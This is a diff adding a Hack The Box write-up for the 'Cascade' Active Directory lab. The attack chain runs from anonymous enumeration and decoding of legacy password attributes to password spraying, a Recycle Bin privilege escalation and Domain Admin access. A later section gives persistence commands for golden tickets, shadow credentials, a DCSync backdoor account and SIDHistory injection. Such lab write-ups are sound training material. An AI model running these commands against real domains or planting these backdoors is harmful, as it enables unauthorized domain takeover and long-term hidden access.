@@ -1,0 +1,458 @@
+````markdown
+# Cascade – Hack The Box (Active Directory Full Compromise)
+
+> **Target type:** Windows Active Directory  
+> **OS:** Windows Server 2008 R2  
+> **Difficulty:** Medium  
+> **Category:** Active Directory / Credential Abuse / Persistence  
+> **Author:** <your_handle>
+
+---
+
+## Overview
+
+This box demonstrates a **classic but realistic Active Directory compromise** relying on:
+
+- Weak credential hygiene
+- Legacy / custom LDAP attributes
+- Poor decommissioning of privileged accounts
+- Abuse of **Active Directory Recycle Bin**
+- Multiple post-exploitation **domain persistence techniques**
+
+The attack chain progresses from **unauthenticated enumeration** to **full Domain Admin compromise**, followed by **long-term persistence**.
+
+---
+
+## 1. Enumeration
+
+### 1.1 Nmap – Service Discovery
+
+We start with a full TCP scan to identify exposed services on the target.
+
+```bash
+nmap -sV -sC -Pn 10.129.12.220 -vv
+````
+
+```
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap
+3269/tcp  open  tcpwrapped
+```
+
+**Key observations:**
+
+* The host is clearly a **Domain Controller**
+* LDAP, Kerberos, SMB, RPC are all exposed
+* SMB signing is enabled (no relay)
+* OS is **Windows Server 2008 R2**, an older but still common AD environment
+
+---
+
+### 1.2 DNS Enumeration
+
+```bash
+dig any cascade.local @10.129.12.220
+```
+
+DNS confirms the **internal AD domain name**, which will be reused throughout LDAP, Kerberos, and SMB attacks.
+
+---
+
+### 1.3 RPC Enumeration (Anonymous)
+
+Anonymous RPC access is allowed, which is often overlooked.
+
+```bash
+rpcclient -U "" -N 10.129.12.220
+```
+
+#### Enumerate Domain Users
+
+```
+rpcclient $> enumdomusers
+CascGuest
+arksvc
+s.smith
+r.thompson
+util
+j.wakefield
+s.hickson
+j.goodhand
+a.turnbull
+e.crowe
+b.hanson
+d.burman
+BackupSvc
+j.allen
+i.croft
+```
+
+This provides a **high-value username list** for LDAP queries and password spraying.
+
+#### Enumerate Domain Groups
+
+```
+rpcclient $> enumdomgroups
+group:[Domain Users]
+group:[Group Policy Creator Owners]
+group:[DnsUpdateProxy]
+```
+
+#### Password Policy
+
+```
+rpcclient $> getdompwinfo
+min_password_length: 5
+password_properties: 0x00000000
+```
+
+🚨 **Extremely weak password policy** — no complexity requirements.
+
+---
+
+### 1.4 SMB Enumeration (Anonymous)
+
+```bash
+crackmapexec smb 10.129.12.220 -u "" -p "" --shares
+```
+
+```
+STATUS_ACCESS_DENIED
+```
+
+Anonymous share access is blocked, but authenticated access may still succeed later.
+
+---
+
+## 2. LDAP Enumeration (Critical Phase)
+
+LDAP is often the **most dangerous attack surface** in poorly hardened AD environments.
+
+```bash
+ldapsearch -x -H ldap://10.129.12.220 -b "DC=cascade,DC=local"
+```
+
+### Attempt to Dump Password Attributes
+
+```bash
+ldapsearch -x -H ldap://10.129.12.220 \
+-b "DC=cascade,DC=local" "(&(objectClass=*)(userPassword=*))" userPassword
+```
+
+```
+nope
+```
+
+Direct password extraction is not possible — but **custom attributes remain**.
+
+---
+
+### 2.1 Extract High-Value User Attributes
+
+```bash
+ldapsearch -x -H ldap://10.129.12.220 \
+-b "DC=cascade,DC=local" \
+"(objectClass=user)" \
+sAMAccountName description info comment memberOf pwdLastSet \
+> ldap_users_full.txt
+```
+
+```bash
+grep -iE "pass|pwd|cred|login|key|secret" ldap_users_full.txt
+```
+
+We notice **interesting legacy attributes**.
+
+#### Key Finding
+
+```
+User r.thompson has a custom attribute:
+cascadeLegacyPwd: clk0bjVldmE=
+```
+
+This is **not a standard AD attribute** and strongly suggests **legacy migration artifacts**.
+
+---
+
+### 2.2 Base64 Decode Legacy Password
+
+```bash
+printf %s 'clk0bjVldmE=' | base64 -d
+```
+
+```
+rY4n5eva
+```
+
+---
+
+## 3. Password Spraying
+
+Using the recovered password against all users:
+
+```bash
+crackmapexec smb 10.129.12.220 -u users.txt -p rY4n5eva --continue-on-success
+```
+
+```
+[+] cascade.local\r.thompson:rY4n5eva
+```
+
+Valid credentials confirmed.
+
+---
+
+## 4. Authenticated SMB Enumeration
+
+```bash
+crackmapexec smb 10.129.12.220 -u r.thompson -p rY4n5eva --shares
+```
+
+```
+Data        READ
+Audit$
+NETLOGON    READ
+SYSVOL      READ
+```
+
+### Manual Access
+
+```bash
+smbclient \\\\10.129.12.220\\Data -U 'r.thompson%rY4n5eva'
+mget *
+```
+
+---
+
+## 5. Sensitive File Discovery
+
+Recovered documentation reveals:
+
+```
+Username is TempAdmin (password is the same as the normal admin account password)
+```
+
+And logs referencing:
+
+```
+Running as user CASCADE\ArkSvc
+```
+
+Also found:
+
+```
+CN=TempAdmin\0ADEL:...,CN=Deleted Objects,DC=cascade,DC=local
+```
+
+🚨 This strongly suggests **mismanaged account deletion**.
+
+---
+
+## 6. Second Credential Leak – s.smith
+
+Recovered from VBS script:
+
+```
+s.smith / sT333ve2
+```
+
+```bash
+crackmapexec smb 10.129.12.220 -u users.txt -p sT333ve2 --continue-on-success
+```
+
+---
+
+## 7. Initial Foothold (WinRM)
+
+```bash
+evil-winrm -i 10.129.12.220 -u s.smith -p 'sT333ve2'
+```
+
+```bash
+whoami /all
+```
+
+Key privilege:
+
+```
+SeMachineAccountPrivilege
+```
+
+User has **domain interaction capabilities**, but no admin access.
+
+---
+
+## 8. Audit Share – SQLite Credential Store
+
+```bash
+smbclient //10.129.12.220/Audit$ -U s.smith
+```
+
+```
+Audit.db
+```
+
+```bash
+sqlitebrowser Audit.db
+```
+
+LDAP table contains:
+
+```
+ArkSvc - BQO5l5Kj9MdErXx6Q6AGOw==
+```
+
+AES-encrypted value.
+
+Decrypt via C#:
+
+[https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz)
+
+Recovered credentials:
+
+```
+ArkSvc / w3lc0meFr31nd
+```
+
+---
+
+## 9. Privilege Escalation via AD Recycle Bin
+
+Reference:
+[https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
+
+ArkSvc has sufficient privileges to enumerate deleted objects.
+
+```powershell
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+```
+
+Deleted account found:
+
+```
+TempAdmin
+```
+
+Retrieve properties:
+
+```powershell
+Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *
+```
+
+Legacy password again:
+
+```
+cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
+```
+
+Decode:
+
+```bash
+printf %s 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
+```
+
+```
+baCT3r1aN00dles
+```
+
+---
+
+## 10. Domain Admin Access
+
+```bash
+evil-winrm -i 10.129.12.220 -u administrator -p 'baCT3r1aN00dles'
+```
+
+```
+cascade\administrator
+```
+
+🎯 **Full domain compromise achieved.**
+
+---
+
+## 11. Domain Persistence Techniques
+
+### 11.1 Golden Ticket
+
+```bash
+secretsdump.py cascade.local/administrator@10.129.12.220
+```
+
+```bash
+ticketer.py -domain cascade.local \
+-domain-sid S-1-5-21-3332504370-1206983947-1165150453 \
+-aesKey <KRBTGT_HASH> \
+-user eviluser \
+-groups 512,518,519,520 eviluser
+```
+
+---
+
+### 11.2 Shadow Credentials
+
+```bash
+pywhisker.py -d cascade.local -u administrator -p <PASS> \
+--target administrator --action add
+```
+
+```bash
+getTGT.py cascade.local/administrator -cert administrator.pfx
+```
+
+---
+
+### 11.3 DCSync Backdoor
+
+```powershell
+net user syncsvc P@ssw0rd! /add /domain
+dsacls "DC=cascade,DC=local" /grant syncsvc:"Replicating Directory Changes"
+dsacls "DC=cascade,DC=local" /grant syncsvc:"Replicating Directory Changes All"
+```
+
+---
+
+### 11.4 GPO Startup Script Persistence
+
+```powershell
+New-GPO -Name "Windows Update Health"
+New-GPLink -Name "Windows Update Health" -Target "DC=cascade,DC=local"
+```
+
+---
+
+### 11.5 SIDHistory Injection
+
+```powershell
+Set-ADUser ghost -Add @{SIDHistory="S-1-5-21-3332504370-1206983947-1165150453-512"}
+```
+
+---
+
+## 12. Final Summary
+
+This attack path demonstrates how:
+
+* Legacy attributes leak plaintext passwords
+* Deleted privileged accounts remain exploitable
+* AD Recycle Bin can be abused for escalation
+* Poor credential hygiene leads to full domain compromise
+
+---
+
+## 13. References
+
+[https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
+[https://docs.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject](https://docs.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject)
+[https://attack.mitre.org/](https://attack.mitre.org/)
+
+```
+
+---
